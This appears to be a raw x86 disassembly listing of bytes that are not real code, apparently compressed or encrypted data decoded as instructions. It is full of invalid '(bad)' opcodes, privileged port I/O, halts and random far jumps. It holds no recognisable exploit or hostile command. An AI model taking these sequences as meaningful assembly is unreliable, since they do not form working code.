  424525:	sbb    al,0xf9
  424527:	imul   esp,DWORD PTR [edx-0x4d6da68],0x2f
  42452e:	idiv   BYTE PTR [eax]
  424530:	mov    dl,0xf9
  424532:	cld    
  424533:	leave  
  424534:	test   DWORD PTR [ebx+0x392f6d1c],esi
  42453a:	dec    ebx
  42453b:	push   edx
  42453c:	and    eax,0xf154f74d
  424541:	sub    eax,DWORD PTR [edx]
  424543:	clc    
  424544:	inc    edx
  424545:	sbb    ch,dl
  424547:	push   0xcae06e9e
  42454c:	pop    edx
  42454d:	hlt    
  42454e:	call   DWORD PTR [esi-0x42]
  424551:	and    eax,0xa3ee1943
  424556:	fmul   st,st(2)
  424558:	out    dx,al
  424559:	cmp    ecx,DWORD PTR [ebp+0x3b747135]
  42455f:	mov    cl,0x94
  424561:	sbb    eax,0x30a2b2cd
  424566:	add    al,0xaf
  424568:	rcl    DWORD PTR [edi],cl
  42456a:	popa   
  42456b:	push   eax
  42456c:	gs dec ebp
  42456e:	dec    esi
  42456f:	lock sbb eax,0x70d01a30
  424575:	pop    ebp
  424576:	sbb    al,0xf4
  424578:	arpl   WORD PTR [edx],di
  42457a:	adc    esi,DWORD PTR [ebp+0x3765610e]
  424580:	xchg   esi,eax
  424581:	ror    ah,1
  424583:	je     0x424560
  424585:	sub    ecx,esp
  424587:	stos   BYTE PTR es:[edi],al
  424588:	or     dl,BYTE PTR [ecx+0x66b3259e]
  42458e:	push   0x4a096ba2
  424593:	in     eax,0xff
  424595:	inc    ecx
  424596:	ficomp WORD PTR [edi+0x5d]
  424599:	je     0x424613
  42459b:	inc    eax
  42459c:	xchg   ebx,eax
  42459d:	jp     0x42461a
  42459f:	ret    0x5a53
  4245a2:	inc    esi
  4245a3:	adc    ah,BYTE PTR [edx+0x5b]
  4245a6:	jae    0x4245b8
  4245a8:	adc    eax,0xccb7de39
  4245ad:	sar    eax,1
	...
  4245b7:	add    BYTE PTR [eax],al
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x81b38b7]
  4245c9:	repnz scas al,BYTE PTR es:[edi]
  4245cb:	mov    esi,0x1fd0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	fistp  DWORD PTR [ebp+0x11374e99]
  4245d8:	sub    al,0x49
  4245da:	fisub  DWORD PTR [ecx-0x1fb778a0]
  4245e0:	pop    edi
  4245e1:	pop    ss
  4245e2:	xchg   ebx,eax
  4245e3:	pop    ecx
  4245e4:	add    eax,0x93fda295
  4245e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245ea:	xchg   DWORD PTR [eax-0x30],ebp
  4245ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ee:	jo     0x424651
  4245f0:	lods   eax,DWORD PTR ds:[esi]
  4245f1:	mov    ss:0xfa0413b0,al
  4245f7:	div    DWORD PTR [ebx+0x729f12]
  4245fd:	outs   dx,DWORD PTR ds:[esi]
  4245fe:	(bad)  
  4245ff:	xor    al,BYTE PTR [ebp-0x6e]
  424602:	das    
  424603:	mov    dh,0xf4
  424605:	push   eax
  424606:	sar    DWORD PTR [ebx],1
  424608:	fadd   QWORD PTR [ebp-0x72438f76]
  42460e:	lahf   
  42460f:	mov    ebp,0xa16e2757
  424614:	iret   
  424615:	pop    edx
  424616:	pop    esi
  424617:	in     eax,0x45
  424619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42461a:	ja     0x4245c9
  42461c:	rcl    DWORD PTR [ecx-0x6f],0x9
  424620:	push   ds
  424621:	or     eax,0x75067752
  424626:	or     DWORD PTR cs:0x85978024,ecx
  42462d:	cld    
  42462e:	aaa    
  42462f:	das    
  424630:	push   esp
  424631:	jge    0x4245c4
  424633:	test   al,0x0
  424635:	rol    BYTE PTR [edx-0x50],1
  424638:	cmp    al,cl
  42463a:	xor    eax,0x17fdf2d0
  42463f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424640:	add    BYTE PTR [ecx-0x53],0x71
  424644:	(bad)  
  424645:	std    
  424646:	test   DWORD PTR [eax],edx
  424648:	mov    WORD PTR [ebp-0x7],ss
  42464b:	out    0x7c,eax
  42464d:	in     eax,dx
  42464e:	push   ebx
  42464f:	in     eax,dx
  424650:	jmp    0xf2909f49
  424655:	pop    ecx
  424656:	ins    BYTE PTR es:[edi],dx
  424657:	pop    esi
  424658:	adc    eax,0x9c827a1f
  42465d:	xor    BYTE PTR gs:[edx-0x55fbea2a],al
  424664:	repz jbe 0x4245fe
  424667:	dec    ebx
  424668:	mov    dh,0x7c
  42466a:	fild   QWORD PTR [edx-0x1dc12766]
  424670:	mov    cl,0x28
  424672:	push   edx
  424673:	mov    ah,0xc8
  424675:	cmp    cl,BYTE PTR [ebx]
  424677:	rcl    DWORD PTR [ecx+0xc4bc0c4],1
  42467d:	push   ecx
  42467e:	scas   eax,DWORD PTR es:[edi]
  42467f:	or     bh,0x34
  424682:	xchg   esp,eax
  424683:	inc    ebp
  424684:	mov    esi,0x6b6937f5
  424689:	pop    es
  42468a:	jmp    0x3e5e:0x83358b80
  424691:	and    esi,0xffffffc2
  424694:	sar    ch,1
  424696:	adc    eax,0x93b06d16
  42469b:	xor    al,0xdc
  42469d:	data16 out dx,al
  42469f:	push   esi
  4246a0:	xchg   ecx,eax
  4246a1:	loope  0x4246bd
  4246a3:	ret    
  4246a4:	mov    bl,0xe4
  4246a6:	gs popa 
  4246a8:	out    0x5e,al
  4246aa:	jle    0x4246e9
  4246ac:	adc    eax,0x94953d05
  4246b1:	(bad)  
  4246b2:	fild   DWORD PTR [edx-0x2a]
  4246b5:	jg     0x4246c9
  4246b7:	stc    
  4246b8:	aad    0x14
  4246ba:	and    BYTE PTR [eax+0x34e10dc8],dl
  4246c0:	xchg   ecx,ebx
  4246c2:	sbb    DWORD PTR [edi],esi
  4246c4:	out    dx,eax
  4246c5:	fcom   DWORD PTR [ebx-0x154420bd]
  4246cb:	sbb    eax,0xebfb1fce
  4246d0:	loop   0x4246d6
  4246d2:	pusha  
  4246d3:	push   esi
  4246d4:	cmp    DWORD PTR [esi],esi
  4246d6:	jnp    0x424747
  4246d8:	sub    al,0xc7
  4246da:	push   ebp
  4246db:	aaa    
  4246dc:	xchg   edi,eax
  4246dd:	inc    ebx
  4246de:	fs mov dh,0x92
  4246e1:	outs   dx,BYTE PTR ds:[esi]
  4246e2:	(bad)  
  4246e3:	cmc    
  4246e4:	pop    es
  4246e5:	adc    al,0x63
  4246e7:	icebp  
  4246e8:	rol    BYTE PTR [eax+0x7f],1
  4246eb:	sub    eax,0xed526748
  4246f0:	or     eax,0x2bdad24d
  4246f5:	test   DWORD PTR [edx-0x20],ebp
  4246f8:	cmp    ch,BYTE PTR [edi+0x64201c0c]
  4246fe:	ret    0x9162
  424701:	data16 (bad) 
  424704:	shr    BYTE PTR [esi-0x72d286e8],cl
  42470a:	pop    ds
  42470b:	sti    
  42470c:	ror    DWORD PTR [esi+eax*2+0x7508d990],cl
  424713:	xor    ebx,DWORD PTR [edi+ebp*8-0x52]
  424717:	push   edi
  424718:	sbb    eax,0x6554ac02
  42471d:	xchg   ebx,eax
  42471e:	scas   eax,DWORD PTR es:[edi]
  42471f:	pusha  
  424720:	ror    BYTE PTR [ebx+esi*8-0x1c],1
  424724:	push   edi
  424725:	mov    dh,dh
  424727:	scas   al,BYTE PTR es:[edi]
  424728:	scas   al,BYTE PTR es:[edi]
  424729:	or     al,0x4b
  42472b:	pop    eax
  42472c:	scas   al,BYTE PTR es:[edi]
  42472d:	jbe    0x42470e
  42472f:	inc    ecx
  424730:	imul   ecx,DWORD PTR [edi+0x1484e825],0xb5a3e849
  42473a:	fist   DWORD PTR [ebx]
  42473c:	jge    0x424794
  42473e:	xor    ah,dl
  424740:	pop    ds
  424741:	pop    es
  424742:	xor    BYTE PTR [edi-0x4c128d19],ch
  424748:	xchg   esp,eax
  424749:	sub    DWORD PTR [ebp+0x3a],esi
  42474c:	mov    bh,al
  42474e:	stos   BYTE PTR es:[edi],al
  42474f:	and    al,0x99
  424751:	pusha  
  424752:	retf   0xf9a4
  424755:	inc    esp
  424756:	mov    ah,0xe2
  424758:	popa   
  424759:	std    
  42475a:	or     eax,0xf275375c
  42475f:	stos   DWORD PTR es:[edi],eax
  424760:	data16 lahf 
  424762:	push   esp
  424763:	dec    eax
  424764:	cmp    ch,cl
  424766:	aad    0xd4
  424768:	hlt    
  424769:	jg     0x424730
  42476b:	sbb    eax,DWORD PTR ds:0x95e90200
  424771:	fistp  WORD PTR [ebx]
  424773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424774:	inc    bx
  424777:	mov    dl,0x41
  424779:	call   0x7804:0x7c7dcaff
  424780:	cli    
  424781:	imul   ebp,DWORD PTR [ebx+0x41034277],0x889751fa
  42478b:	or     ch,ah
  42478d:	sbb    DWORD PTR [eax+0x3c0cd2af],edx
  424793:	xchg   ebx,eax
  424794:	jecxz  0x42477d
  424796:	ret    
  424797:	jo     0x42473b
  424799:	ret    
  42479a:	hlt    
  42479b:	pop    ecx
  42479c:	sub    al,0x58
  42479e:	dec    esp
  42479f:	add    al,0xff
  4247a1:	jg     0x42474b
  4247a3:	pusha  
  4247a4:	xchg   esp,eax
  4247a5:	add    edx,DWORD PTR [ebx-0x70]
  4247a8:	sbb    BYTE PTR [ebx+0x6c0730f1],al
  4247ae:	xor    al,0xc3
  4247b0:	es sahf 
  4247b2:	mov    eax,0xe020e964
  4247b7:	cmp    DWORD PTR ds:0xa9c49a95,ecx
  4247bd:	sti    
  4247be:	outs   dx,BYTE PTR ds:[esi]
  4247bf:	outs   dx,DWORD PTR ds:[esi]
  4247c0:	sbb    eax,0xc7ba21df
  4247c5:	jns    0x424831
  4247c7:	in     al,dx
  4247c8:	test   BYTE PTR [esp+esi*2],dl
  4247cb:	sub    eax,DWORD PTR [ebx-0x60]
  4247ce:	test   DWORD PTR [eax],0x0
  4247d4:	add    BYTE PTR [eax],al
  4247d6:	add    BYTE PTR [eax],al
  4247d8:	add    BYTE PTR [eax],al
  4247da:	pop    esp
  4247db:	mov    edi,0xdce35063
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0xa3
  4247e7:	leave  
  4247e8:	push   0x1c0abc4
  4247ed:	add    ch,bh
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [edi-0x6d],al
  4247f4:	cld    
  4247f5:	and    ebp,esp
  4247f7:	(bad)  
  4247f8:	aad    0xcc
  4247fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247fb:	or     eax,0x224f2889
  424800:	js     0x4247e3
  424802:	(bad)  
  424803:	xor    dh,BYTE PTR [eax+0x13e672f1]
  424809:	mov    ah,0x88
  42480b:	mov    ds:0x37c779a8,eax
  424810:	mov    ds:0x29ebd882,eax
  424815:	add    BYTE PTR [ecx+0x2b],al
  424818:	int    0x71
  42481a:	sbb    al,0xe6
  42481c:	cmp    eax,0x2fed8c5
  424821:	pop    ebp
  424822:	fstp   QWORD PTR [edx]
  424824:	dec    edi
  424825:	or     BYTE PTR [esp+ecx*4-0x2a],bl
  424829:	jmp    0x424894
  42482b:	(bad)  
  42482c:	jns    0x424860
  42482e:	enter  0xa772,0x46
  424832:	push   edi
  424833:	mov    ch,BYTE PTR [eax]
  424835:	sbb    DWORD PTR [ebp-0x22],esp
  424838:	or     ch,dl
  42483a:	cmp    ah,dh
  42483c:	test   bh,0x91
  42483f:	xor    BYTE PTR [edx+0x6e],bh
  424842:	jb     0x424870
  424844:	test   al,0x2
  424846:	inc    eax
  424847:	sbb    bl,bh
  424849:	call   0x7819b909
  42484e:	lds    ebp,FWORD PTR [esi+0x1f]
  424851:	sub    WORD PTR [edi+eiz*4],dx
  424855:	dec    ebp
  424856:	iret   
  424857:	mov    dh,0x5c
  424859:	out    dx,al
  42485a:	sub    ah,BYTE PTR [esi+0x61098892]
  424860:	mov    esi,0x4080d3ce
  424865:	xchg   edx,eax
  424866:	fimul  WORD PTR [ebp-0x23]
  424869:	lea    esp,[edi-0x5f]
  42486c:	cmp    BYTE PTR [edx],bl
  42486e:	addr16 clc 
  424870:	in     al,dx
  424871:	push   eax
  424872:	push   ecx
  424873:	mov    al,0x5c
  424875:	pop    ds
  424876:	hlt    
  424877:	lds    edx,FWORD PTR [ecx-0x5]
  42487a:	fiadd  WORD PTR [ecx]
  42487c:	adc    eax,0x49a9efde
  424881:	rol    DWORD PTR [esp+esi*4-0x33081609],cl
  424888:	hlt    
  424889:	ficom  DWORD PTR [eax-0x703c5f8f]
  42488f:	in     eax,0x27
  424891:	sahf   
  424892:	cwde   
  424893:	mov    cl,0x2c
  424895:	push   ss
  424896:	lahf   
  424897:	cmp    ch,BYTE PTR [ecx-0x17]
  42489a:	std    
  42489b:	mov    edx,edi
  42489d:	mov    eax,0xb501afc3
  4248a2:	push   cs
  4248a3:	mov    edx,0x2690f7d5
  4248a8:	or     al,ah
  4248aa:	mov    dl,0xfc
  4248ac:	(bad)  
  4248ad:	pushf  
  4248ae:	jmp    0x4248bb
  4248b0:	fisttp WORD PTR [ebp+0x35]
  4248b3:	push   cs
  4248b4:	sti    
  4248b5:	xchg   edi,eax
  4248b6:	cld    
  4248b7:	sbb    BYTE PTR [esi+0x12],0xb7
  4248bb:	or     DWORD PTR [edx],0x68
  4248be:	test   eax,0x78ec7e1
  4248c3:	fistp  WORD PTR [ecx]
  4248c5:	adc    al,0x47
  4248c7:	mov    DWORD PTR [ebp-0x517274e9],eax
  4248cd:	or     DWORD PTR [edx-0x3ec6ecc4],esi
  4248d3:	xchg   ecx,eax
  4248d4:	daa    
  4248d5:	in     al,0x6e
  4248d7:	pop    es
  4248d8:	dec    ebx
  4248d9:	shl    DWORD PTR [edi+0x13],cl
  4248dc:	mov    al,ds:0x11a9343b
  4248e1:	push   eax
  4248e2:	inc    edx
  4248e3:	push   cs
  4248e4:	mov    ecx,0xcac125a6
  4248e9:	in     eax,0xd6
  4248eb:	(bad)  
  4248ec:	fst    DWORD PTR [ecx+0x48]
  4248ef:	mov    ecx,0xee965c0f
  4248f4:	mov    dh,0x7b
  4248f6:	lds    ebp,FWORD PTR [ecx+0x6b]
  4248f9:	inc    ecx
  4248fa:	fbstp  TBYTE PTR [ebx]
  4248fc:	sub    esi,edi
  4248fe:	push   ds
  4248ff:	pop    ss
  424900:	mov    BYTE PTR [edx-0x257eaed3],ah
  424906:	mov    ch,0xba
  424908:	call   0x2165:0x91f1c5aa
  42490f:	loopne 0x4248d2
  424911:	aam    0xc1
  424913:	scas   al,BYTE PTR es:[edi]
  424914:	jge    0x4248b3
  424916:	adc    edx,ecx
  424918:	jns    0x42498d
  42491a:	out    dx,eax
  42491b:	fidiv  WORD PTR [ebx+edi*8]
  42491e:	jmp    0xd49083ea
  424923:	test   eax,0x9c6f62e3
  424928:	and    cl,dh
  42492a:	jmp    0x424939
  42492c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42492d:	inc    edi
  42492e:	sbb    bl,cl
  424930:	pop    ds
  424931:	add    esi,DWORD PTR [edx+0x1e]
  424934:	pop    esi
  424935:	and    eax,0x9d966972
  42493a:	dec    esi
  42493b:	cmp    eax,0xf35a622e
  424940:	repnz in eax,0x86
  424943:	lahf   
  424944:	pop    ss
  424945:	mov    ds,WORD PTR [ebx]
  424947:	jmp    0x882d4147
  42494c:	mov    ?,WORD PTR [esi+eax*1]
  42494f:	dec    ecx
  424950:	aam    0x3f
  424952:	fmul   DWORD PTR [eax+0x3d45b6c5]
  424958:	stos   BYTE PTR es:[edi],al
  424959:	fstp   DWORD PTR [edx+0x25]
  42495c:	xchg   ebx,eax
  42495d:	popf   
  42495e:	mov    dl,0x2f
  424960:	mov    ebp,DWORD PTR [edx-0x1c]
  424963:	or     ah,BYTE PTR [ebx+0x6759b50e]
  424969:	push   ds
  42496a:	sub    eax,0xe6de387b
  42496f:	cs jp  0x4249e7
  424972:	lods   eax,DWORD PTR ds:[esi]
  424973:	sub    al,0xa5
  424975:	dec    edi
  424976:	sub    DWORD PTR [ecx+eiz*8+0x41],0x21a55fe9
  42497e:	mov    ds:0xfc936e11,eax
  424983:	imul   ecx,DWORD PTR [ebp-0x474833d0],0x58
  42498a:	jb     0x424932
  42498c:	pop    ds
  42498d:	xor    esi,esi
  42498f:	outs   dx,DWORD PTR ds:[esi]
  424990:	(bad)  
  424991:	cmp    eax,0xaca99a25
  424996:	mov    al,0xd6
  424998:	popa   
  424999:	stos   DWORD PTR es:[edi],eax
  42499a:	adc    eax,0x5a205b06
  42499f:	xlat   BYTE PTR ds:[ebx]
  4249a0:	sar    BYTE PTR [edx],cl
  4249a2:	add    BYTE PTR [ebx+ecx*1-0x49],dh
  4249a6:	loope  0x4249f2
  4249a8:	jnp    0x4249b7
  4249aa:	mul    BYTE PTR [edi-0x3888f19]
  4249b0:	cli    
  4249b1:	jbe    0x424983
  4249b3:	jmp    0x4249a3
  4249b5:	ins    BYTE PTR es:[edi],dx
  4249b6:	sub    BYTE PTR [edx+0x28137142],bl
  4249bc:	mov    esp,0x445b3789
  4249c1:	inc    edi
  4249c2:	add    DWORD PTR [ebp-0x35cdb293],edx
  4249c8:	mov    ds,WORD PTR [ebp+0x3dd4fb86]
  4249ce:	outs   dx,BYTE PTR ds:[esi]
  4249cf:	push   DWORD PTR [ebx+0x34a6644e]
  4249d5:	enter  0x4ee,0x24
  4249d9:	jmp    0x42499c
  4249db:	bound  ecx,QWORD PTR [ecx-0x4c752eed]
  4249e1:	scas   al,BYTE PTR es:[edi]
  4249e2:	bnd jb 0x424a26
  4249e5:	stc    
  4249e6:	retf   0x4849
  4249e9:	out    0x0,eax
  4249eb:	dec    ebp
  4249ec:	loopne 0x424a21
  4249ee:	or     al,BYTE PTR [eax]
	...
  4249f8:	add    BYTE PTR [eax],al
  4249fa:	inc    ebx
  4249fb:	push   ebp
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	pop    esp
  424a07:	inc    esi
  424a08:	xor    edi,DWORD PTR [ebx+0x1c2a8]
  424a0e:	std    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    BYTE PTR [esi+0x32],al
  424a14:	(bad)  
  424a15:	call   0xaa5f8365
  424a1a:	pop    ss
  424a1b:	in     al,0x29
  424a1d:	fwait
  424a1e:	mov    eax,0x892119e9
  424a23:	stos   BYTE PTR es:[edi],al
  424a24:	mov    edx,0xe391362a
  424a29:	pop    eax
  424a2a:	mov    ch,0x87
  424a2c:	mov    eax,eax
  424a2e:	dec    edx
  424a2f:	sub    al,0x16
  424a31:	inc    esi
  424a32:	ret    
  424a33:	jmp    0xcb613b34
  424a38:	sahf   
  424a39:	into   
  424a3a:	cmp    cl,BYTE PTR ds:[edi]
  424a3d:	outs   dx,BYTE PTR ds:[esi]
  424a3e:	jecxz  0x424a66
  424a40:	sbb    al,0x9a
  424a42:	dec    ebp
  424a43:	lock test al,0x6a
  424a46:	mov    bl,0x9d
  424a48:	repnz and BYTE PTR [ebp-0x24626899],0xde
  424a50:	js     0x424abd
  424a52:	jno    0x424a1c
  424a54:	iret   
  424a55:	(bad)  
  424a56:	jg     0x4249e3
  424a58:	in     eax,0xa6
  424a5a:	adc    DWORD PTR [ebx],0x25
  424a5d:	and    DWORD PTR [edx+edx*4+0x152f45e1],0x1d
  424a65:	cmc    
  424a66:	inc    esi
  424a67:	cmp    ebx,edi
  424a69:	fadd   st(3),st
  424a6b:	aad    0x41
  424a6d:	ds shl bl,0xcd
  424a71:	mov    esp,0x1a88281c
  424a76:	jbe    0x424a3e
  424a78:	jo     0x424add
  424a7a:	sti    
  424a7b:	aad    0x3c
  424a7d:	(bad)  
  424a7e:	fcom   st(0)
  424a80:	out    dx,eax
  424a81:	and    al,0x15
  424a83:	ror    edx,1
  424a85:	outs   dx,DWORD PTR ds:[esi]
  424a86:	cmp    esp,esp
  424a88:	jmp    0x504c:0x2b7d26e7
  424a8f:	je     0x424b01
  424a91:	fcom   QWORD PTR [eax]
  424a93:	xchg   ecx,eax
  424a94:	aam    0x56
  424a96:	cmp    DWORD PTR [bx+di+0x4f],edx
  424a9a:	push   0xa521b3f9
  424a9f:	sbb    al,0x32
  424aa1:	and    cl,bh
  424aa3:	fidivr DWORD PTR [ecx]
  424aa5:	and    eax,DWORD PTR [eax+0x50]
  424aa8:	push   ss
  424aa9:	push   0x2a0e2747
  424aae:	loop   0x424b15
  424ab0:	loop   0x424ad8
  424ab2:	test   BYTE PTR [ebp+0x68054930],dl
  424ab8:	push   0xfcbaf473
  424abd:	push   DWORD PTR [ecx+0x58]
  424ac0:	xlat   BYTE PTR ds:[ebx]
  424ac1:	pop    eax
  424ac2:	sub    bl,BYTE PTR [eax-0x5c08d06b]
  424ac8:	or     DWORD PTR [ebx-0x1f],esi
  424acb:	das    
  424acc:	jg     0x424adf
  424ace:	shl    BYTE PTR [esi+0x3154d56a],0xbe
  424ad5:	push   ebp
  424ad6:	jge    0x424ad6
  424ad8:	int    0x1
  424ada:	push   ss
  424adb:	aad    0x70
  424add:	(bad)  
  424ade:	push   edx
  424adf:	sbb    al,0xd
  424ae1:	or     esp,edx
  424ae3:	pop    ss
  424ae4:	repz add dl,bl
  424ae7:	or     edi,DWORD PTR [esi-0x24]
  424aea:	xchg   edx,eax
  424aeb:	cmc    
  424aec:	jnp    0x424a9f
  424aee:	int    0xd9
  424af0:	jno    0x424b39
  424af2:	adc    DWORD PTR [eax+0x33],esi
  424af5:	dec    eax
  424af6:	jle    0x424aa2
  424af8:	push   eax
  424af9:	ins    WORD PTR es:[edi],dx
  424afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424afc:	sub    eax,DWORD PTR ds:0xe53718fd
  424b02:	loopne 0x424b50
  424b04:	dec    edi
  424b05:	jo     0x424aed
  424b07:	aas    
  424b08:	and    esi,DWORD PTR [edi+0x2b]
  424b0b:	(bad)  
  424b0d:	add    al,0xb5
  424b0f:	inc    edi
  424b10:	cwde   
  424b11:	out    0x4f,eax
  424b13:	pop    esp
  424b14:	xor    al,0x53
  424b16:	in     eax,0xf9
  424b18:	dec    edi
  424b19:	sbb    eax,0xf1d6bd2f
  424b1e:	test   al,0xb
  424b20:	cld    
  424b21:	in     al,0x19
  424b23:	(bad)  
  424b24:	fmul   st,st(7)
  424b26:	mov    ecx,0xadbbcc69
  424b2b:	mov    ebx,0x39ae6d9c
  424b30:	lahf   
  424b31:	cld    
  424b32:	pushf  
  424b33:	dec    esi
  424b34:	call   0x36cae540
  424b39:	int    0x2f
  424b3b:	inc    edi
  424b3c:	loope  0x424b6d
  424b3e:	gs mov ebp,0x3dc9e0a
  424b44:	int    0x97
  424b46:	inc    ebp
  424b47:	jne    0x424b80
  424b49:	pop    esp
  424b4a:	push   eax
  424b4b:	dec    edi
  424b4c:	jmp    0x31c9:0xcdba08d9
  424b53:	rcl    bh,0x89
  424b56:	fld    TBYTE PTR [edi-0x48]
  424b59:	sti    
  424b5a:	neg    bl
  424b5c:	in     al,dx
  424b5d:	loope  0x424bbf
  424b5f:	jae    0x424b3e
  424b61:	cs push esp
  424b63:	in     al,dx
  424b64:	mov    eax,0xec900f21
  424b69:	pop    esi
  424b6a:	retf   
  424b6b:	test   DWORD PTR [eax],ecx
  424b6d:	sti    
  424b6e:	push   ebx
  424b6f:	pusha  
  424b70:	mov    eax,ds:0x57eb8885
  424b75:	loop   0x424b62
  424b77:	sub    ecx,ebp
  424b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b7a:	in     eax,0xe5
  424b7c:	or     BYTE PTR [ebp-0x25ba9d1f],0x7b
  424b83:	pop    ss
  424b84:	jmp    0xc8f9:0xca765f7f
  424b8b:	data16 outs dx,BYTE PTR ds:[esi]
  424b8d:	pushf  
  424b8e:	inc    ecx
  424b8f:	mov    cl,0xce
  424b91:	neg    DWORD PTR [edi+ebp*2+0x2aa7d92]
  424b98:	test   eax,0x34ca0e03
  424b9d:	ins    BYTE PTR es:[edi],dx
  424b9e:	nop
  424b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ba0:	scas   al,BYTE PTR es:[edi]
  424ba1:	sbb    cl,BYTE PTR [ecx]
  424ba3:	sar    BYTE PTR [esi],1
  424ba5:	cmp    al,0x30
  424ba7:	pop    esi
  424ba8:	xor    ebp,DWORD PTR [eax-0x40]
  424bab:	addr16 xchg esp,eax
  424bad:	out    dx,eax
  424bae:	into   
  424baf:	pop    edx
  424bb0:	enter  0x6ed0,0x9
  424bb4:	dec    ebx
  424bb5:	push   eax
  424bb6:	loope  0x424bc0
  424bb8:	pop    ecx
  424bb9:	push   es
  424bba:	mov    dl,0x17
  424bbc:	das    
  424bbd:	pop    ss
  424bbe:	sahf   
  424bbf:	pop    es
  424bc0:	lods   al,BYTE PTR ds:[esi]
  424bc1:	ja     0x424b9b
  424bc3:	imul   edi,DWORD PTR [edx-0x9],0xbf41faad
  424bca:	loop   0x424b4f
  424bcc:	test   al,0x48
  424bce:	(bad)  
  424bd0:	out    0x4d,eax
  424bd2:	push   0x61
  424bd4:	add    bl,dl
  424bd6:	cld    
  424bd7:	nop
  424bd8:	xchg   ebp,eax
  424bd9:	mov    ds:0xcf7e55c,al
  424bde:	pop    esi
  424bdf:	xchg   esp,eax
  424be0:	adc    ah,ah
  424be2:	sbb    DWORD PTR [ebp-0x47d142ca],ebp
  424be8:	imul   ebx,eax,0xada60613
  424bee:	in     al,dx
  424bef:	mov    edx,0x93988866
  424bf4:	outs   dx,BYTE PTR ds:[esi]
  424bf5:	imul   eax,ecx,0x4f632e6a
  424bfb:	and    eax,0x4eb9b2dd
  424c00:	cmp    DWORD PTR [eax+eax*4-0x54],0x52bdb990
  424c08:	sbb    esp,eax
  424c0a:	call   0xc0f4fdda
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0xde
  424c27:	ins    BYTE PTR es:[edi],dx
  424c28:	mov    ebp,0x1c4a5d4
  424c2d:	add    ch,bh
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [edi+0x63],bh
  424c34:	mov    DWORD PTR [edi-0x7a],ecx
  424c37:	pop    ds
  424c38:	cmp    esp,DWORD PTR [edi]
  424c3a:	popf   
  424c3b:	lods   eax,DWORD PTR ds:[esi]
  424c3c:	scas   al,BYTE PTR es:[edi]
  424c3d:	mov    dl,BYTE PTR [ebx+0x77]
  424c40:	cmp    al,0x5a
  424c42:	push   ebp
  424c43:	loop   0x424c75
  424c45:	les    ecx,FWORD PTR ds:[edi+0x39]
  424c49:	retf   
  424c4a:	jecxz  0x424c7b
  424c4c:	mov    al,ds:0x63794a51
  424c51:	fnsave [ecx-0x2c]
  424c54:	int3   
  424c55:	pop    esi
  424c56:	ds int3 
  424c58:	(bad)  
  424c59:	cmp    ah,BYTE PTR [ecx-0x3e3d40b4]
  424c5f:	mov    eax,ds:0x5a02b9a0
  424c64:	mov    ds:0x4415f9ee,eax
  424c69:	imul   DWORD PTR [ecx+eax*8]
  424c6c:	dec    edx
  424c6d:	pop    edi
  424c6e:	fmul   DWORD PTR [ecx+eax*2]
  424c71:	pop    ds
  424c72:	mov    dh,0x72
  424c74:	mul    edx
  424c76:	jo     0x424cd6
  424c78:	inc    edx
  424c79:	adc    al,BYTE PTR ds:0xa529b741
  424c7f:	fwait
  424c80:	rcl    BYTE PTR [edx+0x13],1
  424c83:	adc    cl,BYTE PTR [ebp+0x15]
  424c86:	das    
  424c87:	test   eax,0x82909cd7
  424c8c:	jecxz  0x424c63
  424c8e:	mov    dh,0xff
  424c90:	mov    ch,0x1c
  424c92:	pop    esp
  424c93:	(bad)  
  424c94:	in     al,0x8f
  424c96:	arpl   cx,si
  424c98:	dec    esi
  424c99:	dec    ecx
  424c9a:	inc    edx
  424c9b:	out    0x2b,eax
  424c9d:	push   ecx
  424c9e:	and    edi,DWORD PTR [edx]
  424ca0:	or     eax,eax
  424ca2:	repnz out 0x85,eax
  424ca5:	out    0xa,al
  424ca7:	ror    BYTE PTR [ebx],cl
  424ca9:	inc    eax
  424caa:	or     edi,edi
  424cac:	xchg   edx,eax
  424cad:	mov    ch,0xda
  424caf:	shl    BYTE PTR [ecx],cl
  424cb1:	add    ah,BYTE PTR [ebp+0x3ab45dd4]
  424cb7:	jmp    0x8e653e27
  424cbc:	mov    cs,esp
  424cbe:	push   eax
  424cbf:	in     eax,dx
  424cc0:	mov    ch,0xab
  424cc2:	push   ebx
  424cc3:	loop   0x424caf
  424cc5:	or     al,0x1e
  424cc7:	test   DWORD PTR [ebp+0x19],0x41c6c904
  424cce:	shl    eax,cl
  424cd0:	sahf   
  424cd1:	hlt    
  424cd2:	xor    BYTE PTR [edx],bl
  424cd4:	sub    al,0xe4
  424cd6:	adc    ecx,DWORD PTR [esi-0x7cb1f819]
  424cdc:	rcl    BYTE PTR [edi+0x37],1
  424cdf:	mov    ch,0x87
  424ce1:	and    DWORD PTR [ebx+ecx*2],0x7d
  424ce5:	xor    bh,al
  424ce7:	cdq    
  424ce8:	push   ss
  424ce9:	out    0xb0,al
  424ceb:	aam    0xf2
  424ced:	sbb    dl,BYTE PTR [ebx-0x57]
  424cf0:	rcl    DWORD PTR [ebx],1
  424cf2:	add    DWORD PTR [esi-0x6d],ebx
  424cf5:	pop    eax
